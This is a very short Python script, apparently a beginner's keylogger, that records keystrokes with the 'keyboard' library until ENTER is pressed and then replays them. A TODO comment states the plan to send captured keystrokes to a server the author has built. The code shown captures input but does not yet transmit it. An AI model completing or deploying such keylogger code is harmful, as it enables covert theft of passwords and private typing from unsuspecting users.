# TODO : improvement : Build the keylogger to send the capture keystrokes to a server I've build

import keyboard

keys = keyboard.record(until = 'ENTER')
keyboard.play(keys)
